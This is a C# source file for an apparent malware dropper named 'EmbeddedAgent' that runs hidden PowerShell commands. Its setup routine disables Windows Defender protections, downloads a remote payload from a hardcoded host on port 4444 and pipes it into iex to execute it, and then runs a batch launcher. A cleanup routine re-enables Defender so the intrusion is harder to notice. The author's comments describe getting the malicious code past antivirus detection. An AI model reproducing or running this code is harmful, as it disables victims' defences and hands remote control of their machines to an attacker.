using System.Diagnostics;

namespace EmbeddedAgent
{
    internal class AgentProcess
    {
        public static void ExecuteCommands(List<string> commands)
        {
            ProcessStartInfo psi = new ProcessStartInfo();

            psi.CreateNoWindow = true;
            psi.FileName = "powershell.exe";
            psi.WindowStyle = ProcessWindowStyle.Hidden;

            psi.ArgumentList.Add("-Command");

            commands.ForEach(command =>
            {
                psi.ArgumentList.Add(command + ";");
            });

            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.CreateNoWindow = true;

            Process process = new Process();

            process.StartInfo = psi;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            process.WaitForExit();
            Console.WriteLine(output);
        }

        public static bool CheckIfLauncherIsAlreadyInstalled()
        {
            return File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "launcher.bat"));
        }

        /*
        * TODO test cases
        *I have to figure out why now the av doesn't let me disable it and run my command
        */
        public static List<string> InitCommands()
        {

            //if (!CheckIfLauncherIsAlreadyInstalled())
            //  commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");
            return new List<string>
            {
                $"cd $env:tmp",
                "Set-ExecutionPolicy Unrestricted",
                "Set-MpPreference -DisableRealtimeMonitoring $True",
                "Set-MpPreference -DisableBehaviorMonitoring $True",
                "Set-MpPreference -DisableBlockAtFirstSeen $True",
                "Set-MpPreference -DisableIOAVProtection $True",
                "Set-MpPreference -DisablePrivacyMode $True",
                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $True",
                "Set-MpPreference -DisableArchiveScanning $True",
                "Set-MpPreference -DisableScriptScanning $True",
                "Set-MpPreference -DisableIntrusionPreventionSystem $True",
                "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.131:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
                ".\\launcher.bat"
            }; ;
        }

        /*
         * TODO test cases
         * 
         * So now, I know that even after i restart the win defender the malicious code does not detected, but there is one problem,
         * I cant figure out the time i have to wait to run the clean up commands, when waiting after the background worker, but the file launcher.bat always get deleted
         */
        public static List<string> CleanUpCommands()
        {
            //commands.Add("Remove-Item .\\launcher.bat");

            return new List<string>
            {
                "Set-ExecutionPolicy Restricted",
                "Set-MpPreference -DisableRealtimeMonitoring $False",
                "Set-MpPreference -DisableBehaviorMonitoring $False",
                "Set-MpPreference -DisableBlockAtFirstSeen $False",
                "Set-MpPreference -DisableIOAVProtection $False",
                "Set-MpPreference -DisablePrivacyMode $False",
                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $False",
                "Set-MpPreference -DisableArchiveScanning $False ",
                "Set-MpPreference -DisableIntrusionPreventionSystem $False"
            }; ;
        }
    }
}
